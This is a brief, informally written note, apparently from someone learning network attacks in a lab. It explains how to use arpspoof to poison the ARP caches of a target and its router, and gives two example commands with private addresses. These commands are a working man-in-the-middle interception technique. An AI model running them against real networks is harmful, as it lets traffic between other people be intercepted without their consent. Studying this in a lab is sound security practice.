arpspoof -i ( interface) + name + -t (target) ip_target (ip want to spoof)

you must do it with target and router , because arp is u fake ip with target and tell the router that I am the target, and you tell the target that I am the router

example:
arpspoof -i eth0 -t 192.168.88.129 192.168.88.2(tell the target)
arpspoof -i eth0 -t 192.168.88.2 192.168.88.129(tell the router)
